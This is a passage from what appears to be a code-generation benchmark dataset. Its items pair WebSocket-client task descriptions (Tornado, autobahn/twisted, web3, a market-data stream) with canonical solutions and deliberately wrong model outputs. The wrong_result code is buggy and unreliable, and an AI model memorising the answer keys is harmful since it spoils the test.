ping_timeout: Optional[float] = None,\n        max_message_size: int = _default_max_message_size,\n        subprotocols: Optional[List[str]] = None,\n        resolver: Optional[Resolver] = None,\n    ) -> None:\n        self.connect_future = Future()\n        self.read_queue = Queue(1)\n        self.key = base64.b64encode(os.urandom(16))\n        self._on_message_callback = on_message_callback\n        self.close_code = None\n        self.close_reason = None\n        self.params = _WebSocketParams(\n            ping_interval=ping_interval,\n            ping_timeout=ping_timeout,\n            max_message_size=max_message_size,\n            compression_options=compression_options,\n        )\n\n        scheme, sep, rest = request.url.partition(\":\")\n        scheme = {\"ws\": \"http\", \"wss\": \"https\"}[scheme]\n        request.url = scheme + sep + rest\n        request.headers.update(\n            {\n                \"Upgrade\": \"websocket\",\n                \"Connection\": \"Upgrade\",\n                \"Sec-WebSocket-Key\": to_unicode(self.key),\n                \"Sec-WebSocket-Version\": \"13\",\n            }\n        )\n        if subprotocols is not None:\n            request.headers[\"Sec-WebSocket-Protocol\"] = \",\".join(subprotocols)\n        if compression_options is not None:\n            request.headers[\"Sec-WebSocket-Extensions\"] = (\n                \"permessage-deflate; client_max_window_bits\"\n            )\n\n        request.follow_redirects = False\n\n        self.tcp_client = TCPClient(resolver=resolver)\n        super().__init__(\n            None,\n            request,\n            lambda: None,\n            self._on_http_response,\n            104857600,\n            self.tcp_client,\n            65536,\n            104857600,\n        )\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if self.protocol is not None:\n            self.protocol.close(code, reason)\n            self.protocol = None\n\n    def on_connection_close(self) -> None:\n        if not self.connect_future.done():\n            self.connect_future.set_exception(StreamClosedError())\n        self._on_message(None)\n        self.tcp_client.close()\n        super().on_connection_close()\n\n    def on_ws_connection_close(\n        self, close_code: Optional[int] = None, close_reason: Optional[str] = None\n    ) -> None:\n        self.close_code = close_code\n        self.close_reason = close_reason\n        self.on_connection_close()\n\n    def _on_http_response(self, response: httpclient.HTTPResponse) -> None:\n        if not self.connect_future.done():\n            if response.error:\n                self.connect_future.set_exception(response.error)\n            else:\n                self.connect_future.set_exception(\n                    WebSocketError(\"Non-websocket response\")\n                )\n\n    async def headers_received(\n        self,\n        start_line: Union[httputil.RequestStartLine, httputil.ResponseStartLine],\n        headers: httputil.HTTPHeaders,\n    ) -> None:\n        assert isinstance(start_line, httputil.ResponseStartLine)\n        if start_line.code != 101:\n            await super().headers_received(start_line, headers)\n            return\n\n        if self._timeout is not None:\n            self.io_loop.remove_timeout(self._timeout)\n            self._timeout = None\n\n        self.headers = headers\n        self.protocol = self.get_websocket_protocol()\n        self.protocol._process_server_headers(self.key, self.headers)\n        self.protocol.stream = self.connection.detach()\n\n        IOLoop.current().add_callback(self.protocol._receive_frame_loop)\n        self.protocol.start_pinging()\n\n        self.final_callback = None\n        future_set_result_unless_cancelled(self.connect_future, self)\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        if self.protocol is None:\n            raise WebSocketClosedError(\"Client connection has been closed\")\n        return self.protocol.write_message(message, binary=binary)\n\n    def read_message(\n        self,\n        callback: Optional[Callable[[\"Future[Union[None, str, bytes]]\"], None]] = None,\n    ) -> Awaitable[Union[None, str, bytes]]:\n        awaitable = self.read_queue.get()\n        if callback is not None:\n            self.io_loop.add_future(asyncio.ensure_future(awaitable), callback)\n        return awaitable\n\n    def _on_message(\n        self, message: Union[None, str, bytes]\n    ) -> Optional[Awaitable[None]]:\n        if self._on_message_callback:\n            self._on_message_callback(message)\n            return None\n        else:\n            return self.read_queue.put(message)\n\n    def ping(self, data: bytes = b\"\") -> None:\n        data = utf8(data)\n        if self.protocol is None:\n            raise WebSocketClosedError()\n        self.protocol.write_ping(data)\n\n    def get_websocket_protocol(self) -> \"WebSocketProtocol\":\n        return WebSocketProtocol13(self, mask_outgoing=True, params=self.params)\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        return self.protocol.selected_subprotocol\n\nclass _WebSocketParams:\n    def __init__(\n        self,\n        ping_interval: Optional[float] = None,\n        ping_timeout: Optional[float] = None,\n        max_message_size: int = _default_max_message_size,\n        compression_options: Optional[Dict[str, Any]] = None,\n    ) -> None:\n        self.ping_interval = ping_interval\n        self.ping_timeout = ping_timeout\n        self.max_message_size = max_message_size\n        self.compression_options = compression_options\n\nclass WebSocketProtocol(abc.ABC):\n    def __init__(self, handler: Any) -> None:\n        self.handler = handler\n        self.stream = None\n        self.client_terminated = False\n        self.server_terminated = False\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        raise NotImplementedError()\n\n    def is_closing(self) -> bool:\n        raise NotImplementedError()\n\n    async def accept_connection(self, handler: Any) -> None:\n        raise NotImplementedError()\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        raise NotImplementedError()\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        raise NotImplementedError()\n\n    def write_ping(self, data: bytes) -> None:\n        raise NotImplementedError()\n\n    def _process_server_headers(\n        self, key: Union[str, bytes], headers: httputil.HTTPHeaders\n    ) -> None:\n        raise NotImplementedError()\n\n    def start_pinging(self) -> None:\n        raise NotImplementedError()\n\n    async def _receive_frame_loop(self) -> None:\n        raise NotImplementedError()\n\n    def set_nodelay(self, x: bool) -> None:\n        raise NotImplementedError()\n\nclass WebSocketProtocol13(WebSocketProtocol):\n    FIN = 0x80\n    RSV1 = 0x40\n    RSV2 = 0x20\n    RSV3 = 0x10\n    RSV_MASK = RSV1 | RSV2 | RSV3\n    OPCODE_MASK = 0x0F\n\n    def __init__(\n        self,\n        handler: Any,\n        mask_outgoing: bool,\n        params: _WebSocketParams,\n    ) -> None:\n        super().__init__(handler)\n        self.mask_outgoing = mask_outgoing\n        self.params = params\n        self._final_frame = False\n        self._frame_opcode = None\n        self._frame_mask = None\n        self._frame_length = None\n        self._fragmented_message_buffer = None\n        self._fragmented_message_opcode = None\n        self._waiting = None\n        self._compression_options = params.compression_options\n        self._decompressor = None\n        self._compressor = None\n        self._frame_compressed = None\n        self._message_bytes_in = 0\n        self._message_bytes_out = 0\n        self._wire_bytes_in = 0\n        self._wire_bytes_out = 0\n        self.ping_callback = None\n        self.last_ping = 0.0\n        self.last_pong = 0.0\n        self.close_code = None\n        self.close_reason = None\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        return self._selected_subprotocol\n\n    @selected_subprotocol.setter\n    def selected_subprotocol(self, value: Optional[str]) -> None:\n        self._selected_subprotocol = value\n\n    def _process_server_headers(\n        self, key: Union[str, bytes], headers: httputil.HTTPHeaders\n    ) -> None:\n        assert headers[\"Upgrade\"].lower() == \"websocket\"\n        assert headers[\"Connection\"].lower() == \"upgrade\"\n        accept = self.compute_accept_value(key)\n        assert headers[\"Sec-Websocket-Accept\"] == accept\n\n        extensions = self._parse_extensions_header(headers)\n        for ext in extensions:\n            if ext[0] == \"permessage-deflate\" and self._compression_options is not None:\n                self._create_compressors(\"client\", ext[1])\n            else:\n                raise ValueError(\"unsupported extension %r\", ext)\n\n        self.selected_subprotocol = headers.get(\"Sec-WebSocket-Protocol\", None)\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        if binary:\n            opcode = 0x2\n        else:\n            opcode = 0x1\n        if isinstance(message, dict):\n            message = tornado.escape.json_encode(message)\n        message = tornado.escape.utf8(message)\n        assert isinstance(message, bytes)\n        self._message_bytes_out += len(message)\n        flags = 0\n        if self._compressor:\n            message = self._compressor.compress(message)\n            flags |= self.RSV1\n        try:\n            fut = self._write_frame(True, opcode, message, flags=flags)\n        except StreamClosedError:\n            raise WebSocketClosedError()\n\n        async def wrapper() -> None:\n            try:\n                await fut\n            except StreamClosedError:\n                raise WebSocketClosedError()\n\n        return asyncio.ensure_future(wrapper())\n\n    def write_ping(self, data: bytes) -> None:\n        assert isinstance(data, bytes)\n        self._write_frame(True, 0x9, data)\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if not self.server_terminated:\n            if not self.stream.closed():\n                if code is None and reason is not None:\n                    code = 1000\n                if code is None:\n                    close_data = b\"\"\n                else:\n                    close_data = struct.pack(\">H\", code)\n                if reason is not None:\n                    close_data += utf8(reason)\n                try:\n                    self._write_frame(True, 0x8, close_data)\n                except StreamClosedError:\n                    self._abort()\n            self.server_terminated = True\n        if self.client_terminated:\n            if self._waiting is not None:\n                self.stream.io_loop.remove_timeout(self._waiting)\n                self._waiting = None\n            self.stream.close()\n        elif self._waiting is None:\n            self._waiting = self.stream.io_loop.add_timeout(\n                self.stream.io_loop.time() + 5, self._abort\n            )\n        if self.ping_callback:\n            self.ping_callback.stop()\n            self.ping_callback = None\n\n    def is_closing(self) -> bool:\n        return self.stream.closed() or self.client_terminated or self.server_terminated\n\n    def start_pinging(self) -> None:\n        if self.ping_interval is not None and self.ping_interval > 0:\n            self.last_ping = self.last_pong = IOLoop.current().time()\n            self.ping_callback = PeriodicCallback(\n                self.periodic_ping, self.ping_interval * 1000\n            )\n            self.ping_callback.start()\n\n    @staticmethod\n    def compute_accept_value(key: Union[str, bytes]) -> str:\n        sha1 = hashlib.sha1()\n        sha1.update(utf8(key))\n        sha1.update(b\"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\")\n        return native_str(base64.b64encode(sha1.digest()))\n\n    def _parse_extensions_header(\n        self, headers: httputil.HTTPHeaders\n    ) -> List[Tuple[str, Dict[str, str]]]:\n        extensions = headers.get(\"Sec-WebSocket-Extensions\", \"\")\n        if extensions:\n            return [httputil._parse_header(e.strip()) for e in extensions.split(\",\")]\n        return []\n\n    def _write_frame(\n        self, fin: bool, opcode: int, data: bytes, flags: int = 0\n    ) -> \"Future[None]\":\n        data_len = len(data)\n        if opcode & 0x8:\n            if not fin:\n                raise ValueError(\"control frames may not be fragmented\")\n            if data_len > 125:\n                raise ValueError(\"control frame payloads may not exceed 125 bytes\")\n        if fin:\n            finbit = self.FIN\n        else:\n            finbit = 0\n        frame = struct.pack(\"B\", finbit | opcode | flags)\n        if self.mask_outgoing:\n            mask_bit = 0x80\n        else:\n            mask_bit = 0\n        if data_len < 126:\n            frame += struct.pack(\"B\", data_len | mask_bit)\n        elif data_len <= 0xFFFF:\n            frame += struct.pack(\"!BH\", 126 | mask_bit, data_len)\n        else:\n            frame += struct.pack(\"!BQ\", 127 | mask_bit, data_len)\n        if self.mask_outgoing:\n            mask = os.urandom(4)\n            data = mask + _websocket_mask(mask, data)\n        frame += data\n        self._wire_bytes_out += len(frame)\n        return self.stream.write(frame)\n\ndef websocket_connect(\n    url: Union[str, httpclient.HTTPRequest],\n    callback: Optional[Callable[[\"Future[WebSocketClientConnection]\"], None]] = None,\n    connect_timeout: Optional[float] = None,\n    on_message_callback: Optional[Callable[[Union[None, str, bytes]], None]] = None,\n    compression_options: Optional[Dict[str, Any]] = None,\n    ping_interval: Optional[float] = None,\n    ping_timeout: Optional[float] = None,\n    max_message_size: int = _default_max_message_size,\n    subprotocols: Optional[List[str]] = None,\n    resolver: Optional[Resolver] = None,\n) -> \"Awaitable[WebSocketClientConnection]\":\n    if isinstance(url, httpclient.HTTPRequest):\n        assert connect_timeout is None\n        request = url\n        request.headers = httputil.HTTPHeaders(request.headers)\n    else:\n        request = httpclient.HTTPRequest(url, connect_timeout=connect_timeout)\n    request = cast(\n        httpclient.HTTPRequest,\n        httpclient._RequestProxy(request, httpclient.HTTPRequest._DEFAULTS),\n    )\n    conn = WebSocketClientConnection(\n        request,\n        on_message_callback=on_message_callback,\n        compression_options=compression_options,\n        ping_interval=ping_interval,\n        ping_timeout=ping_timeout,\n        max_message_size=max_message_size,\n        subprotocols=subprotocols,\n        resolver=resolver,\n    )\n    if callback is not None:\n        IOLoop.current().add_future(conn.connect_future, callback)\n    return conn.connect_future",
    "Code_level": "Class-level",
    "FSMID_for_test": 51,
    "wrong_result": "import tornado.ioloop\nimport tornado.websocket\nimport tornado.web\nimport asyncio\nfrom tornado import gen\nfrom tornado.concurrent import Future\nfrom tornado.tcpclient import TCPClient\nfrom tornado.httpclient import HTTPClient, HTTPRequest\nfrom tornado.httpproxy import ProxyHandler\nfrom tornado.options import options\nimport json\nimport ssl\nimport socket\nimport threading\nimport queue\n\nclass WebSocketClientConnection:\n    def __init__(self, request: HTTPRequest, on_message_callback: Optional[Callable], compression_options: Optional[Dict], ping_interval: Optional[float], ping_timeout: Optional[float], max_message_size: int, subprotocols: Optional[List[str]], resolver: Optional[Resolver]) -> None:\n        self.connect_future = Future()\n        self.read_queue = queue.Queue()\n        self.key = b''\n        self._on_message_callback = on_message_callback\n        self.close_code = None\n        self.close_reason = None\n        self.params = _WebSocketParams()\n        self.tcp_client = TCPClient()\n        self.protocol = None\n\n    def close(self, code: Optional[int], reason: Optional[str]) -> None:\n        if self.protocol:\n            self.protocol.close(code, reason)\n        self.connect_future.set_result(None)\n\n    def on_connection_close(self) -> None:\n        self.close_code = None\n        self.close_reason = None\n        self.connect_future.set_result(None)\n\n    def on_ws_connection_close(self, close_code: Optional[int], close_reason: Optional[str]) -> None:\n        self.close_code = close_code\n        self.close_reason = close_reason\n        self.connect_future.set_result(None)\n\n    def _on_http_response(self, response: HTTPResponse) -> None:\n        if response.code == 101:\n            self.protocol = self.get_websocket_protocol()\n            self.protocol.connection_made(response)\n            self.connect_future.set_result(None)\n        else:\n            self.close(1002, \"HTTP error\")\n\n    def headers_received(self, start_line: Union[RequestStartLine, ResponseStartLine], headers: HTTPHeaders) -> Awaitable[None]:\n        if isinstance(start_line, ResponseStartLine) and start_line.version == 11 and start_line.status == 101:\n            self.key = headers.get(b\"Sec-WebSocket-Key\")\n            self.protocol = self.get_websocket_protocol()\n            self.protocol.connection_made(headers)\n            self.connect_future.set_result(None)\n        else:\n            self.close(1002, \"Invalid HTTP response\")\n\n    def write_message(self, message: Union[str, bytes, Dict[str, Any]], binary: bool) -> Future[None]:\n        if self.protocol:\n            return self.protocol.write_message(message, binary)\n        return Future()\n\n    def read_message(self, callback: Optional[Callable]) -> Awaitable[Union[None, str, bytes]]:\n        if self.protocol:\n            return self.protocol.read_message(callback)\n        return Future()\n\n    def _on_message(self, message: Union[None, str, bytes]) -> Optional[Awaitable[None]]:\n        if self._on_message_callback:\n            return self._on_message_callback(message)\n        return None\n\n    def ping(self, data: bytes) -> None:\n        if self.protocol:\n            self.protocol.ping(data)\n\n    def get_websocket_protocol(self) -> WebSocketProtocol:\n        return WebSocketProtocol(self, self._on_message, self.on_connection_close, self.on_ws_connection_close)\n\nclass WebSocketProtocol(tornado.websocket.WebSocketHandler):\n    def __init__(self, client, on_message, on_connection_close, on_ws_connection_close):\n        super().__init__()\n        self.client = client\n        self.on_message = on_message\n        self.on_connection_close = on_connection_close\n        self.on_ws_connection_close = on_ws_connection_close\n\n    def check_origin(self, origin):\n        return True\n\n    def open(self):\n        self.client.protocol = self\n        self.client.connect_future.set_result(None)\n\n    def on_message(self, message):\n        self.client._on_message(message)\n\n    def on_close(self):\n        self.client.on_connection_close()\n        self.client.on_ws_connection_close(None, None)\n\n    def ping(self, data):\n        self.client.ping(data)\n\n    def write_message(self, message, binary):\n        super().write_message(message, binary)\n\nclass WebSocketClient:\n    def __init__(self, url: str, on_message_callback: Optional[Callable] = None, compression_options: Optional[Dict] = None, ping_interval: Optional[float] = None, ping_timeout: Optional[float] = None, max_message_size: int = 1024, subprotocols: Optional[List[str]] = None, resolver: Optional[Resolver] = None):\n        self.url = url\n        self.on_message_callback = on_message_callback\n        self.compression_options = compression_options\n        self.ping_interval = ping_interval\n        self.ping_timeout = ping_timeout\n        self.max_message_size = max_message_size\n        self.subprotocols = subprotocols\n        self.resolver = resolver\n        self._connect()\n\n    def _connect(self):\n        http_client = HTTPClient()\n        request = HTTPRequest(self.url, method=\"GET\", headers={\n            \"Upgrade\": \"websocket\",\n            \"Connection\": \"Upgrade\",\n            \"Sec-WebSocket-Key\": self._generate_key(),\n            \"Sec-WebSocket-Version\": \"13\"\n        })\n        if self.subprotocols:\n            request.headers[\"Sec-WebSocket-Protocol\"] = \",\".join(self.subprotocols)\n        http_client.fetch(request, callback=self._on_fetch)\n\n    def _generate_key(self):\n        import base64\n        import os\n        key = os.urandom(16)\n        return base64.b64encode(key).decode()\n\n    def _on_fetch(self, response):\n        if response.error:\n            print(\"Error:\", response.error)\n            return\n        if response.code == 101:\n            self._on_handshake(response)\n        else:\n            print(\"HTTP error:\", response.code)\n            self._on_error()\n\n    def _on_handshake(self, response):\n        self._on_connection_established()\n\n    def _on_connection_established(self):\n        self._on_message_callback = self.on_message_callback\n        self._start_pinging()\n\n    def _start_pinging(self):\n        if self.ping_interval is not None:\n            self._ping_task = asyncio.create_task(self._ping_loop())\n            self._ping_task.add_done_callback(self._on_ping_complete)\n\n    async def _ping_loop(self):\n        while True:\n            await asyncio.sleep(self.ping_interval)\n            self.protocol.ping(b\"ping\")\n\n    def _on_ping_complete(self, future):\n        if future.exception():\n            self._on_error()\n\n    def _on_error(self):\n        self._on_connection_closed(1002, \"Connection error\")\n\n    def _on_connection_closed(self, code, reason):\n        self._on_message_callback = None\n        self._stop_pinging()\n\n    def _stop_pinging(self):\n        if self._ping_task:\n            self._ping_task.cancel()\n\n    def send_message(self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False):\n        if self.protocol:\n            self.protocol.write_message(message, binary)\n\n    def read_message(self, callback: Optional[Callable] = None):\n        if self.protocol:\n            return self.protocol.read_message(callback)\n        return None\n\n    def close(self):\n        if self.protocol:\n            self.protocol.close()\n        self._on_connection_closed(1000, \"Connection closed\")\n\n    def on_message(self, message):\n        if self._on_message_callback:\n            self._on_message_callback(message)\n\n    def on_close(self):\n        self._on_connection_closed(1000, \"Connection closed\")"
  },
  {
    "Task_id": 435,
    "Instruction": "Task Description: Implement a WebSocket client using autobahn and twisted in Python to connect to a server, send a random number, receive the squared result, and then close the connection.\n\nClass Description: The WebSocketClient class establishes a WebSocket connection to a specified server, handles the communication protocol, and manages the connection lifecycle.\n\nAttributes:\n- host: str - The IP address or hostname of the WebSocket server (default: \"127.0.0.1\").\n- port: int - The port number of the WebSocket server (default: 9000).\n- factory: WebSocketClientFactory - The factory instance responsible for creating protocol instances and managing the WebSocket connection.\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket client with the specified host and port.\n- run() -> None - Connects to the WebSocket server using the reactor and starts the event loop.\n\nNested Class: SlowSquareClientProtocol(WebSocketClientProtocol) - Handles the WebSocket protocol events for the client.\n\nMethods (SlowSquareClientProtocol):\n- onOpen() -> None - Called when the WebSocket connection is established. Sends a random number to the server.\n- onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received from the server. Processes the squared result and closes the connection.\n- onClose(wasClean: bool, code: int, reason: str) -> None - Called when the WebSocket connection is closed. Stops the reactor loop.",
    "Canonical_solution": "from autobahn.twisted.websocket import WebSocketClientProtocol, WebSocketClientFactory\nimport json\nimport random\nfrom twisted.internet import reactor\n\nclass SlowSquareClientProtocol(WebSocketClientProtocol):\n    def onOpen(self):\n        x = 10. * random.random()\n        self.sendMessage(json.dumps(x).encode('utf8'))\n        print(\"Request to square {} sent.\".format(x))\n\n    def onMessage(self, payload, isBinary):\n        if not isBinary:\n            res = json.loads(payload.decode('utf8'))\n            print(\"Result received: {}\".format(res))\n            self.sendClose()\n\n    def onClose(self, wasClean, code, reason):\n        if reason:\n            print(reason)\n        reactor.stop()\n\nclass WebSocketClient:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketClientFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = SlowSquareClientProtocol\n\n    def run(self):\n        reactor.connectTCP(self.host, self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 53,
    "wrong_result": "from autobahn.twisted.websocket import WebSocketClientProtocol, WebSocketClientFactory\nfrom twisted.internet import reactor\nimport random\n\nclass WebSocketClient:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketClientFactory()\n\n    def run(self):\n        reactor.connectTCP(self.host, self.port, self.factory)\n        reactor.run()\n\nclass SlowSquareClientProtocol(WebSocketClientProtocol):\n    def onOpen(self):\n        super().onOpen()\n        random_number = random.randint(1, 100)\n        self.sendString(str(random_number))\n\n    def onMessage(self, payload, isBinary):\n        if not isBinary:\n            squared_result = int(payload) ** 2\n            print(f\"Received squared result: {squared_result}\")\n            self.close()\n\n    def onClose(self, wasClean, code, reason):\n        print(\"Connection closed.\")\n        reactor.stop()\n\nclass WebSocketClientFactory(WebSocketClientFactory):\n    def buildProtocol(self, addr):\n        return SlowSquareClientProtocol()"
  },
  {
    "Task_id": 438,
    "Instruction": "Task Description: Implement a WebSocket client class in Python using asyncio and websockets libraries to handle persistent WebSocket connections, send/receive messages, and manage connection lifecycle.\n\nClass Description: The PersistentWebSocket class manages a persistent WebSocket connection with automatic reconnection handling and proper resource cleanup. It's designed to be used as an asynchronous context manager.\n\nAttributes:\n- ws: Optional[WebSocketClientProtocol] - The active WebSocket connection object\n- endpoint_uri: str - The WebSocket server URI to connect to\n- websocket_kwargs: Any - Additional keyword arguments for the WebSocket connection\n\nMethods:\n- __aenter__() -> WebSocketClientProtocol - Asynchronously establishes a connection if none exists and returns the WebSocket client protocol\n- __aexit__(exc_type: type, exc_val: BaseException, exc_tb: Any) -> None - Handles connection cleanup on context exit, closing the connection if an exception occurred\n\nClass Description: The LegacyWebSocketProvider class extends JSONBaseProvider to provide WebSocket-based JSON-RPC functionality with timeout support and batch request handling.\n\nAttributes:\n- _loop: ClassVar[Any] - The asyncio event loop used for running coroutines\n- endpoint_uri: Optional[Union[str, URI]] - The WebSocket server endpoint URI\n- websocket_timeout: int - Timeout value for WebSocket operations\n- conn: PersistentWebSocket - The persistent WebSocket connection instance\n\nMethods:\n- coro_make_request(request_data: bytes) -> RPCResponse - Coroutine that sends a request and waits for a response through the WebSocket connection\n- make_request(method: RPCEndpoint, params: Any) -> RPCResponse - Synchronous method to make a single RPC request\n- make_batch_request(requests: List[Tuple[RPCEndpoint, Any]]) -> List[RPCResponse] - Synchronous method to make a batch of RPC requests",
    "Canonical_solution": "import asyncio\nimport json\nfrom typing import (\n    Any,\n    List,\n    Optional,\n    Tuple,\n    Union,\n    cast,\n)\nfrom websockets.client import (\n    connect,\n)\nfrom websockets.legacy.client import (\n    WebSocketClientProtocol,\n)\nfrom web3.providers.base import (\n    JSONBaseProvider,\n)\nfrom web3.types import (\n    RPCEndpoint,\n    RPCResponse,\n)\n\nclass PersistentWebSocket:\n    def __init__(self, endpoint_uri: str, websocket_kwargs: Any) -> None:\n        self.ws: Optional[WebSocketClientProtocol] = None\n        self.endpoint_uri = endpoint_uri\n        self.websocket_kwargs = websocket_kwargs\n\n    async def __aenter__(self) -> WebSocketClientProtocol:\n        if self.ws is None:\n            self.ws = await connect(uri=self.endpoint_uri, **self.websocket_kwargs)\n        return self.ws\n\n    async def __aexit__(\n        self,\n        exc_type: type,\n        exc_val: BaseException,\n        exc_tb: Any,\n    ) -> None:\n        if exc_val is not None:\n            try:\n                await self.ws.close()\n            except Exception:\n                pass\n            self.ws = None\n\nclass LegacyWebSocketProvider(JSONBaseProvider):\n    _loop = None\n\n    def __init__(\n        self,\n        endpoint_uri: Optional[Union[str, URI]] = None,\n        websocket_kwargs: Optional[Any] = None,\n        websocket_timeout: int = 30,\n        **kwargs: Any,\n    ) -> None:\n        self.endpoint_uri = endpoint_uri\n        self.websocket_timeout = websocket_timeout\n        if websocket_kwargs is None:\n            websocket_kwargs = {}\n        self.conn = PersistentWebSocket(self.endpoint_uri, websocket_kwargs)\n        super().__init__(**kwargs)\n\n    async def coro_make_request(self, request_data: bytes) -> RPCResponse:\n        async with self.conn as conn:\n            await asyncio.wait_for(\n                conn.send(request_data), timeout=self.websocket_timeout\n            )\n            return json.loads(\n                await asyncio.wait_for(conn.recv(), timeout=self.websocket_timeout)\n            )\n\n    def make_request(self, method: RPCEndpoint, params: Any) -> RPCResponse:\n        request_data = self.encode_rpc_request(method, params)\n        future = asyncio.run_coroutine_threadsafe(\n            self.coro_make_request(request_data), LegacyWebSocketProvider._loop\n        )\n        return future.result()\n\n    def make_batch_request(\n        self, requests: List[Tuple[RPCEndpoint, Any]]\n    ) -> List[RPCResponse]:\n        request_data = self.encode_batch_rpc_request(requests)\n        future = asyncio.run_coroutine_threadsafe(\n            self.coro_make_request(request_data), LegacyWebSocketProvider._loop\n        )\n        response = cast(List[RPCResponse], future.result())\n        return response",
    "Code_level": "Class-level",
    "FSMID_for_test": 46,
    "wrong_result": "class PersistentWebSocket:\n    def __init__(self, endpoint_uri: str, **websocket_kwargs):\n        self.endpoint_uri = endpoint_uri\n        self.websocket_kwargs = websocket_kwargs\n        self.ws = None\n\n    async def __aenter__(self) -> WebSocketClientProtocol:\n        if self.ws is None:\n            self.ws = await websockets.connect(self.endpoint_uri, **self.websocket_kwargs)\n        return self.ws\n\n    async def __aexit__(self, exc_type: type, exc_val: BaseException, exc_tb: Any) -> None:\n        if self.ws is not None:\n            await self.ws.close()\n            self.ws = None\n\n\nclass JSONBaseProvider:\n    def __init__(self):\n        self._loop = asyncio.get_event_loop()\n\n\nclass LegacyWebSocketProvider(JSONBaseProvider):\n    def __init__(self, endpoint_uri: str, websocket_timeout: int = 10):\n        super().__init__()\n        self.endpoint_uri = endpoint_uri\n        self.websocket_timeout = websocket_timeout\n        self.conn = PersistentWebSocket(endpoint_uri)\n\n    async def coro_make_request(self, request_data: bytes) -> RPCResponse:\n        try:\n            async with self.conn as ws:\n                await ws.send(request_data)\n                response = await ws.recv()\n                return RPCResponse(response)\n        except websockets.exceptions.ConnectionClosed:\n            raise RPCError(\"Connection closed\")\n\n    def make_request(self, method: RPCEndpoint, params: Any) -> RPCResponse:\n        request_data = json.dumps({\"method\": method, \"params\": params})\n        return self.loop.run_until_complete(self.coro_make_request(request_data))\n\n    def make_batch_request(self, requests: List[Tuple[RPCEndpoint, Any]]) -> List[RPCResponse]:\n        batch_requests = [{\"method\": method, \"params\": params} for method, params in requests]\n        batch_data = json.dumps({\"jsonrpc\": \"2.0\", \"method\": \"batch\", \"params\": batch_requests})\n        return self.loop.run_until_complete(self.coro_make_request(batch_data))"
  },
  {
    "Task_id": 439,
    "Instruction": "Task Description: Implement a WebSocket client class for streaming financial market data with authentication, subscription management, and message handling capabilities.\n\nClass Description: The _DataStream class establishes and maintains a WebSocket connection to a financial data streaming service. It handles authentication, manages subscriptions to different types of market data (trades, quotes, bars), processes incoming messages, and provides methods for controlling the connection lifecycle.\n\nAttributes:\n- _endpoint: str - WebSocket server URL\n- _key_id: str - API key for authentication\n- _secret_key: str - API secret for authentication\n- _ws: WebSocketClientProtocol - Active WebSocket connection\n- _running: bool - Connection status flag\n- _loop: asyncio.AbstractEventLoop - Event loop reference\n- _raw_data: bool - Flag for raw data processing\n- _stop_stream_queue: queue.Queue - Queue for stop signals\n- _handlers: Dict[str, Dict] - Dictionary of message handlers per data type\n- _name: str - Connection name identifier\n- _should_run: bool - Control flag for main loop\n- _max_frame_size: int - Maximum WebSocket frame size\n- _websocket_params: Dict - WebSocket connection parameters\n\nMethods:\n- __init__(endpoint: str, key_id: str, secret_key: str, raw_data: bool = False, websocket_params: Optional[Dict] = None) -> None - Initialize the data stream with connection parameters\n- _connect() -> None - Establish WebSocket connection\n- _auth() -> None - Authenticate with the server\n- _start_ws() -> None - Combined connection and authentication\n- close() -> None - Close the WebSocket connection\n- stop_ws() -> None - Signal to stop the WebSocket connection\n- _consume() -> None - Main message processing loop\n- _dispatch(msg: Dict) -> None - Route messages to appropriate handlers\n- _subscribe(handler: Callable, symbols: List[str], handlers: Dict) -> None - Internal subscription management\n- _subscribe_all() -> None - Send all active subscriptions to server\n- _run_forever() -> None - Main connection management loop\n- subscribe_trades(handler: Callable, *symbols: str) -> None - Subscribe to trade data\n- subscribe_quotes(handler: Callable, *symbols: str) -> None - Subscribe to quote data\n- subscribe_bars(handler: Callable, *symbols: str) -> None - Subscribe to bar data\n- subscribe_updated_bars(handler: Callable, *symbols: str) -> None - Subscribe to updated bar data\n- subscribe_daily_bars(handler: Callable, *symbols: str) -> None - Subscribe to daily bar data\n- stop() -> None - Stop the WebSocket connection and processing",
    "Canonical_solution": "import asyncio\nimport websockets\nimport msgpack\nimport queue\nfrom typing import Dict, Optional\n\nclass _DataStream:\n    def __init__(self,\n                 endpoint: str,\n                 key_id: str,\n                 secret_key: str,\n                 raw_data: bool = False,\n                 websocket_params: Optional[Dict] = None) -> None:\n        self._endpoint = endpoint\n        self._key_id = key_id\n        self._secret_key = secret_key\n        self._ws = None\n        self._running = False\n        self._loop = None\n        self._raw_data = raw_data\n        self._stop_stream_queue = queue.Queue()\n        self._handlers = {\n            'trades':      {},\n            'quotes':      {},\n            'bars':        {},\n            'updatedBars': {},\n            'dailyBars':   {},\n        }\n        self._name = 'data'\n        self._should_run = True\n        self._max_frame_size = 32768\n        self._websocket_params = websocket_params or {\n            \"ping_interval\": 10,\n            \"ping_timeout\": 180,\n            \"max_queue\": 1024,\n        }\n\n    async def _connect(self):\n        self._ws = await websockets.connect(\n            self._endpoint,\n            extra_headers={'Content-Type': 'application/msgpack'},\n            **self._websocket_params\n        )\n        r = await self._ws.recv()\n        msg = msgpack.unpackb(r)\n        if msg[0]['T'] != 'success' or msg[0]['msg'] != 'connected':\n            raise ValueError('connected message not received')\n\n    async def _auth(self):\n        await self._ws.send(\n            msgpack.packb({\n                'action': 'auth',\n                'key':    self._key_id,\n                'secret': self._secret_key,\n            }))\n        